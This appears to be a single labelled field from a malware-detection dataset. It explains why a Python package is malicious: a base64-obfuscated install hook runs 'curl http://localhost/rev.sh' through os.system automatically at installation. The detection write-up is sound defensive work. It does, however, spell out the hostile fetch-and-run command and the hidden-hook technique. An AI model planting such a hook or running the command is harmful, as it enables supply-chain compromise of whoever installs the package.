      "malicious_behavior": "The code contains malicious behavior because it executes a shell command during the package installation process without user interaction or consent. Specifically, the function 'notmalfunc' decodes a base64-encoded string to the command 'curl http://localhost/rev.sh' and executes it via os.system. This occurs in the 'AfterInstall' class's run method, which is hooked into the setuptools install command, causing the command to run automatically upon package installation. Executing a curl command to fetch a script from a remote URL and running it is a classic pattern of remote code execution and payload delivery, typical of supply chain attacks and malicious PyPI packages. The use of base64 encoding to hide the command further indicates obfuscation to evade detection. There is no user notification, validation, or legitimate application logic justifying this behavior. Therefore, this code is malicious."
